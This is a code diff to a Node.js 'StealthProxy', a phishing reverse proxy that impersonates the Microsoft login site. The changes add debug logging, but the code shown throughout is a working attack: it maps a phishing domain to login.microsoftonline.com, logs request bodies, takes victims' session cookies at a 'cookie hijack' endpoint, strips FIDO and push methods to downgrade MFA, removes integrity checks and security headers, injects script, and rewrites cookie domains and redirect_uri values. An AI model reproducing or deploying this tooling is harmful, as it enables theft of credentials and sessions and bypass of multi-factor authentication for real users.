@@ -36,6 +36,11 @@ const PHISHING_DOMAIN = process.env.PHISHING_DOMAIN || 'localhost';
 const REDIRECT_URL = process.env.REDIRECT_URL || 'https://www.google.com';
 const TARGET_HOST = process.env.TARGET_HOST || 'login.microsoftonline.com';
 
+console.log('[CONFIG] ENCRYPTION_KEY set:', ENCRYPTION_KEY.substring(0, 8) + '...');
+console.log('[CONFIG] PHISHING_DOMAIN:', PHISHING_DOMAIN);
+console.log('[CONFIG] REDIRECT_URL:', REDIRECT_URL);
+console.log('[CONFIG] TARGET_HOST:', TARGET_HOST);
+
 // ---- Bidirectional domain mapping (Carlos technique) ----
 const SUBDOMAIN_MAPPING = {
   [PHISHING_DOMAIN]: TARGET_HOST,
@@ -49,6 +54,8 @@ const REVERSE_MAPPING = {};
 for (const [phish, real] of Object.entries(SUBDOMAIN_MAPPING)) {
   REVERSE_MAPPING[real] = phish;
 }
+
+console.log('[CONFIG] SUBDOMAIN_MAPPING:', SUBDOMAIN_MAPPING);
 
 // ---- Obfuscated entry point - looks like OAuth ----
 const ENTRY_PATH = '/auth/start';
@@ -68,9 +75,15 @@ const PATHS = {
   session: '/api/session'
 };
 
+console.log('[CONFIG] ENTRY_PATH:', ENTRY_PATH);
+console.log('[CONFIG] TARGET_PARAM:', TARGET_PARAM);
+console.log('[CONFIG] FILES:', FILES);
+console.log('[CONFIG] PATHS:', PATHS);
+
 // ---- Logging directory ----
 const LOG_DIR = join(process.cwd(), 'data');
 if (!existsSync(LOG_DIR)) mkdirSync(LOG_DIR);
+console.log('[CONFIG] LOG_DIR:', LOG_DIR);
 const logStreams = {};
 
 // ---- Session store ----
@@ -87,21 +100,26 @@ class StealthProxy {
     this.targetHost = TARGET_HOST;
     this.subdomainMap = SUBDOMAIN_MAPPING;
     this.reverseMap = REVERSE_MAPPING;
+    console.log('[PROXY] Constructor done');
   }
 
   // ---- HTTP Server entry ----
   start(port = process.env.PORT || 3000) {
     const server = createServer(this._onRequest.bind(this));
-    server.listen(port, () => console.log(`Proxy running on port ${port}`));
+    server.listen(port, () => console.log(`[PROXY] Proxy running on port ${port}`));
   }
 
   // ---- Request handler ----
   async _onRequest(req, res) {
     const { method, url, headers } = req;
+    console.log(`[REQUEST] ${method} ${url} (from ${headers.host})`);
+
     const sessionId = this._getSession(headers.cookie);
+    console.log(`[REQUEST] sessionId: ${sessionId || 'none'}`);
 
     // ---- Preflight (OPTIONS) handling (Carlos technique) ----
     if (method === 'OPTIONS') {
+      console.log('[REQUEST] OPTIONS preflight request');
       res.writeHead(204, {
         'Access-Control-Allow-Origin': `https://${headers.host}`,
         'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
@@ -115,45 +133,62 @@ class StealthProxy {
 
     // ---- Serve index page (phishing entry) ----
     if (url.startsWith(ENTRY_PATH) && url.includes(TARGET_PARAM)) {
+      console.log('[REQUEST] ✅ Matching ENTRY_PATH – serving landing page');
       return this._serveLandingPage(req, res, url);
     }
 
     // ---- Handle known paths ----
     if (url === PATHS.serviceWorker) {
+      console.log('[REQUEST] ✅ Serving Service Worker:', url);
       return this._serveFile(res, PATHS.serviceWorker.slice(1), 'text/javascript');
     }
     if (url === PATHS.script) {
+      console.log('[REQUEST] ✅ Serving Script:', url);
       return this._serveFile(res, FILES.script, 'text/javascript');
     }
     if (url === PATHS.relay && !sessionId) {
+      console.log('[REQUEST] ✅ Anonymous relay request');
       return this._handleAnonymousRelay(req, res);
     }
 
     // ---- Authenticated session or relay endpoint ----
     if (sessionId || url === PATHS.relay) {
       if (url === PATHS.session) {
+        console.log('[REQUEST] ✅ Cookie hijack endpoint');
         return this._handleCookieHijack(req, res, sessionId);
       }
       if (url === PATHS.nav) {
+        console.log('[REQUEST] ✅ Navigation rewrite endpoint');
         return this._handleNavRewrite(req, res, sessionId);
       }
+      console.log('[REQUEST] ✅ Proxying request (session or relay)');
       return this._handleProxiedRequest(req, res, sessionId);
     }
 
     // ---- Fallback ----
+    console.log(`[REQUEST] ❌ No route matched – redirecting to ${this.redirectUrl}`);
     res.writeHead(302, { Location: this.redirectUrl });
     res.end();
   }
 
   // ---- Serve landing page ----
   _serveLandingPage(req, res, url) {
+    console.log('[LANDING] _serveLandingPage called');
+    console.log('[LANDING] URL:', url);
     try {
-      const target = new URL(decodeURIComponent(url.match(new RegExp(`(?<=${TARGET_PARAM}=)[^&]+`))[0]));
+      const match = url.match(new RegExp(`(?<=${TARGET_PARAM}=)[^&]+`));
+      console.log('[LANDING] Regex match result:', match);
+      if (!match) throw new Error('No target parameter found');
+
+      const target = new URL(decodeURIComponent(match[0]));
+      console.log('[LANDING] Target extracted:', target.href);
+
       let sessionId = this._getSession(req.headers.cookie);
       if (!sessionId) {
         const { name, value } = this._createSession(target);
         res.setHeader('Set-Cookie', `${name}=${value}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
         sessionId = name;
+        console.log('[LANDING] New session created:', sessionId);
       }
       sessions[sessionId].target = {
         protocol: target.protocol,
@@ -162,9 +197,11 @@ class StealthProxy {
         path: target.pathname + target.search,
         host: target.host
       };
+      console.log('[LANDING] Serving index file:', FILES.index);
       res.writeHead(200, { 'Content-Type': 'text/html' });
       createReadStream(FILES.index).pipe(res);
     } catch (e) {
+      console.log('[LANDING] ❌ Error:', e.message);
       res.writeHead(404);
       createReadStream(FILES.notFound).pipe(res);
     }
@@ -172,6 +209,7 @@ class StealthProxy {
 
   // ---- Serve static file ----
   _serveFile(res, filePath, mime) {
+    console.log('[SERVE] Serving file:', filePath);
     res.writeHead(200, { 'Content-Type': mime });
     createReadStream(filePath).pipe(res);
   }
@@ -182,7 +220,10 @@ class StealthProxy {
     const cookies = cookieHeader.split('; ');
     for (const c of cookies) {
       const [name, value] = c.split('=');
-      if (sessions[name] && sessions[name].value === value) return name;
+      if (sessions[name] && sessions[name].value === value) {
+        console.log('[SESSION] Found session:', name);
+        return name;
+      }
     }
     return null;
   }
@@ -193,6 +234,7 @@ class StealthProxy {
     sessions[name] = { value, cookies: [], logFile: `${target.hostname}_${Date.now()}` };
     const stream = createWriteStream(join(LOG_DIR, sessions[name].logFile), { flags: 'a' });
     logStreams[name] = stream;
+    console.log('[SESSION] Created:', name);
     return { name, value };
   }
 
@@ -209,14 +251,18 @@ class StealthProxy {
 
   // ---- Handle anonymous relay (no session) ----
   async _handleAnonymousRelay(req, res) {
+    console.log('[ANON_RELAY] Called');
     const url = new URL(req.url, `http://${req.headers.host}`);
     const targetParam = url.searchParams.get('target');
+    console.log('[ANON_RELAY] target param:', targetParam);
     if (!targetParam) {
+      console.log('[ANON_RELAY] ❌ No target param – redirecting');
       res.writeHead(302, { Location: this.redirectUrl });
       return res.end();
     }
     try {
       const target = new URL(decodeURIComponent(targetParam));
+      console.log('[ANON_RELAY] Target:', target.href);
       const { name, value } = this._createSession(target);
       res.setHeader('Set-Cookie', `${name}=${value}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
       sessions[name].target = {
@@ -227,9 +273,11 @@ class StealthProxy {
         host: target.host
       };
       const redirect = `${sessions[name].target.protocol}//${req.headers.host}${sessions[name].target.path}`;
+      console.log('[ANON_RELAY] Redirecting to:', redirect);
       res.writeHead(302, { Location: redirect });
       res.end();
     } catch (e) {
+      console.log('[ANON_RELAY] ❌ Error:', e.message);
       res.writeHead(404);
       createReadStream(FILES.notFound).pipe(res);
     }
@@ -237,15 +285,19 @@ class StealthProxy {
 
   // ---- Handle cookie hijack ----
   async _handleCookieHijack(req, res, sessionId) {
+    console.log('[COOKIE] Cookie hijack endpoint');
     let body = '';
     req.on('data', chunk => body += chunk);
     req.on('end', () => {
+      console.log('[COOKIE] Received cookie:', body.substring(0, 50) + '...');
       if (sessionId) {
         this._updateCookies(sessionId, [body], req.headers.host);
         const domains = this._getValidDomains([req.headers.host, sessions[sessionId].target.hostname]);
+        console.log('[COOKIE] Returning valid domains:', domains);
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify(domains));
       } else {
+        console.log('[COOKIE] ❌ No session ID');
         res.writeHead(403);
         res.end();
       }
@@ -254,11 +306,18 @@ class StealthProxy {
 
   // ---- Handle navigation rewrite (MutationObserver) ----
   async _handleNavRewrite(req, res, sessionId) {
+    console.log('[NAV] Navigation rewrite endpoint');
     const url = new URL(req.url, `http://${req.headers.host}`);
     const targetParam = url.searchParams.get(TARGET_PARAM);
-    if (!targetParam) { res.writeHead(400); return res.end(); }
+    console.log('[NAV] Target param:', targetParam);
+    if (!targetParam) {
+      console.log('[NAV] ❌ No target param');
+      res.writeHead(400);
+      return res.end();
+    }
     try {
       const target = new URL(decodeURIComponent(targetParam));
+      console.log('[NAV] Target:', target.href);
       if (sessionId) {
         sessions[sessionId].target = {
           protocol: target.protocol,
@@ -269,9 +328,11 @@ class StealthProxy {
         };
       }
       const redirect = `${sessions[sessionId].target.protocol}//${req.headers.host}${sessions[sessionId].target.path}`;
+      console.log('[NAV] Redirecting to:', redirect);
       res.writeHead(302, { Location: redirect });
       res.end();
     } catch (e) {
+      console.log('[NAV] ❌ Error:', e.message);
       res.writeHead(404);
       createReadStream(FILES.notFound).pipe(res);
     }
@@ -279,9 +340,11 @@ class StealthProxy {
 
   // ---- Main proxy handler ----
   async _handleProxiedRequest(req, res, sessionId) {
+    console.log('[PROXY] Main proxy handler');
     const { method, headers, url } = req;
     const session = sessions[sessionId];
     if (!session) {
+      console.log('[PROXY] ❌ No session found');
       res.writeHead(302, { Location: this.redirectUrl });
       return res.end();
     }
@@ -289,32 +352,35 @@ class StealthProxy {
     // Determine target from query param (for relay) or session target
     let targetUrl;
     const parsed = new URL(url, `http://${headers.host}`);
+    console.log('[PROXY] Parsed URL:', parsed.href);
+
     if (parsed.pathname === PATHS.relay) {
       const t = parsed.searchParams.get('target');
+      console.log('[PROXY] Relay target param:', t);
       if (t) targetUrl = new URL(decodeURIComponent(t));
     }
     if (!targetUrl) {
       const t = session.target;
       targetUrl = new URL(t.protocol + '//' + t.host + t.path);
     }
+    console.log('[PROXY] Final target URL:', targetUrl.href);
 
-    // ---- Domain rewriting via mapping (Carlos technique) ----
-    // Rewrite target host using SUBDOMAIN_MAPPING (if phishing domain appears)
+    // ---- Domain rewriting via mapping ----
     let targetHostname = targetUrl.hostname;
-    // If the target hostname is one of our phishing subdomains, map to real
     if (this.subdomainMap[targetHostname]) {
       targetHostname = this.subdomainMap[targetHostname];
       targetUrl.hostname = targetHostname;
+      console.log('[PROXY] Mapped hostname to:', targetHostname);
     }
-    // Also rewrite the host header if it's a phishing domain
     let effectiveHost = headers.host;
     if (this.subdomainMap[effectiveHost]) {
       effectiveHost = this.subdomainMap[effectiveHost];
+      console.log('[PROXY] Mapped host header to:', effectiveHost);
     }
 
-    // Update session target if navigation request
     const isNav = headers['sec-fetch-mode'] === 'navigate' || headers['upgrade-insecure-requests'] === '1';
     if (isNav) {
+      console.log('[PROXY] Navigation request detected');
       session.target = {
         protocol: targetUrl.protocol,
         hostname: targetHostname,
@@ -333,12 +399,10 @@ class StealthProxy {
       headers: { ...headers },
       rejectUnauthorized: false
     };
-    // Remove host header override
     delete options.headers.host;
-    // Set correct host (real Microsoft domain)
     options.headers.host = effectiveHost;
 
-    // Remove unwanted headers – expanded for Canary headers (Carlos)
+    // Remove unwanted headers
     const dropHeaders = [
       'x-forwarded-for', 'x-arr-log-id', 'client-ip', 'x-site-deployment-id',
       'x-canary', 'x-microsoft-telemetry', 'x-ms-telemetry', 'x-ms-request-id',
@@ -347,13 +411,18 @@ class StealthProxy {
     ];
     for (const h of dropHeaders) delete options.headers[h];
 
+    console.log('[PROXY] Options:', JSON.stringify(options, null, 2).substring(0, 200) + '...');
+
     // Prepare request body
     let bodyBuffer = [];
     req.on('data', chunk => bodyBuffer.push(chunk));
     req.on('end', async () => {
       const body = Buffer.concat(bodyBuffer);
+      console.log('[PROXY] Request body length:', body.length);
       const proto = targetUrl.protocol === 'https:' ? httpsRequest : httpRequest;
       const proxyReq = proto(options, (proxyRes) => {
+        console.log('[PROXY] Response status:', proxyRes.statusCode);
+
         // Log transaction
         this._log(sessionId, {
           time: new Date().toISOString(),
@@ -364,18 +433,19 @@ class StealthProxy {
           body: body.toString('utf8')
         }).catch(() => {});
 
-        // ---- MFA Downgrade (Carlos) ----
         let isJson = proxyRes.headers['content-type']?.includes('application/json');
         let isHtml = proxyRes.headers['content-type']?.includes('text/html');
         let responseBody = [];
         proxyRes.on('data', chunk => responseBody.push(chunk));
         proxyRes.on('end', async () => {
           let fullBody = Buffer.concat(responseBody);
+          console.log('[PROXY] Response body length:', fullBody.length);
 
           // Decompress if needed
           let encodings = [];
           if (proxyRes.headers['content-encoding']) {
             encodings = proxyRes.headers['content-encoding'].split(',').map(e => e.trim());
+            console.log('[PROXY] Encodings:', encodings);
             for (let enc of encodings) {
               try {
                 if (enc === 'gzip') fullBody = await gunzipAsync(fullBody);
@@ -388,12 +458,15 @@ class StealthProxy {
 
           // ---- JSON MFA downgrade ----
           if (isJson && targetUrl.pathname.includes('/common/login')) {
+            console.log('[PROXY] MFA downgrade – JSON detected');
             try {
               const json = JSON.parse(fullBody.toString('utf8'));
               if (json.arrUserProofs) {
+                const originalCount = json.arrUserProofs.length;
                 json.arrUserProofs = json.arrUserProofs.filter(
                   m => m.authMethodId !== 'FidoKey' && m.authMethodId !== 'PhoneAppNotification'
                 );
+                console.log(`[PROXY] MFA downgrade: removed ${originalCount - json.arrUserProofs.length} methods`);
                 if (json.arrUserProofs.length === 0) {
                   json.arrUserProofs.push({
                     authMethodId: 'PhoneAppOTP',
@@ -406,25 +479,30 @@ class StealthProxy {
                 }
                 fullBody = Buffer.from(JSON.stringify(json));
               }
-            } catch (e) {}
+            } catch (e) {
+              console.log('[PROXY] MFA downgrade error:', e.message);
+            }
           }
 
           // ---- HTML injection + SRI removal + redirect_uri rewriting ----
           if (isHtml) {
+            console.log('[PROXY] HTML response – injecting payload');
             let html = fullBody.toString('utf8');
 
-            // SRI removal (Carlos)
+            // SRI removal
             html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
             html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
             html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
 
             // redirect_uri rewriting
+            const replaced = html.match(/redirect_uri=https%3A%2F%2Flogin\.microsoftonline\.com/g)?.length || 0;
             html = html.replace(/redirect_uri=https%3A%2F%2Flogin\.microsoftonline\.com/g,
                                 `redirect_uri=https%3A%2F%2F${this.phishingDomain}`);
             html = html.replace(/redirect_uri=https:\/\/login\.microsoftonline\.com/g,
                                 `redirect_uri=https://${this.phishingDomain}`);
+            console.log(`[PROXY] Rewrote ${replaced} redirect_uri occurrences`);
 
-            // Dynamic script injection (no static <script src>)
+            // Dynamic script injection
             const injectCode = `
               <script>
                 (async function() {
@@ -440,21 +518,24 @@ class StealthProxy {
             `;
             if (html.includes('</head>')) {
               html = html.replace('</head>', injectCode + '</head>');
+              console.log('[PROXY] Injected script before </head>');
             } else if (html.includes('</body>')) {
               html = html.replace('</body>', injectCode + '</body>');
+              console.log('[PROXY] Injected script before </body>');
             } else {
               html = injectCode + html;
+              console.log('[PROXY] Injected script at start of HTML');
             }
             fullBody = Buffer.from(html);
           }
 
-          // ---- Server‑side Set-Cookie domain rewriting (Carlos) ----
+          // ---- Server‑side Set-Cookie domain rewriting ----
           if (proxyRes.headers['set-cookie']) {
             const originalCookies = proxyRes.headers['set-cookie'];
+            console.log('[PROXY] Rewriting Set-Cookie headers');
             let rewrittenCookies = Array.isArray(originalCookies) ? originalCookies : [originalCookies];
             rewrittenCookies = rewrittenCookies.map(cookie => {
               let newCookie = cookie;
-              // Replace Microsoft domains with phishing domain
               newCookie = newCookie.replace(/Domain=\.?microsoftonline\.com/gi, `Domain=.${this.phishingDomain}`);
               newCookie = newCookie.replace(/Domain=\.?login\.microsoft\.com/gi, `Domain=.${this.phishingDomain}`);
               newCookie = newCookie.replace(/Domain=\.?login\.live\.com/gi, `Domain=.${this.phishingDomain}`);
@@ -467,6 +548,7 @@ class StealthProxy {
 
           // ---- Re-compress if needed ----
           if (encodings.length) {
+            console.log('[PROXY] Re-compressing response');
             for (let enc of encodings.reverse()) {
               try {
                 if (enc === 'gzip') fullBody = await gzipAsync(fullBody);
@@ -477,9 +559,8 @@ class StealthProxy {
             }
           }
 
-          // ---- Send response with modified headers ----
+          // ---- Send response ----
           const newHeaders = { ...proxyRes.headers };
-          // Remove security headers (already done via deleteHTTPSecurityResponseHeaders but we do it here)
           delete newHeaders['content-security-policy'];
           delete newHeaders['x-frame-options'];
           delete newHeaders['x-xss-protection'];
@@ -489,19 +570,19 @@ class StealthProxy {
           delete newHeaders['cross-origin-resource-policy'];
           delete newHeaders['permissions-policy'];
           delete newHeaders['service-worker-allowed'];
-          // Add CORS and cache control
           newHeaders['cache-control'] = 'no-store';
           newHeaders['access-control-allow-origin'] = `https://${req.headers.host}`;
           if (newHeaders['content-length']) {
             newHeaders['content-length'] = fullBody.length;
           }
+          console.log('[PROXY] Sending response status:', proxyRes.statusCode);
           res.writeHead(proxyRes.statusCode, newHeaders);
           res.end(fullBody);
         });
       });
 
       proxyReq.on('error', (e) => {
-        console.error('Proxy request error:', e);
+        console.error('[PROXY] ❌ Proxy request error:', e.message);
         res.writeHead(502);
         res.end();
       });
@@ -533,5 +614,7 @@ class StealthProxy {
 }
 
 // ---- Start server ----
+console.log('[MAIN] Starting proxy server...');
 const proxy = new StealthProxy();
 proxy.start();
+console.log('[MAIN] Proxy started successfully');
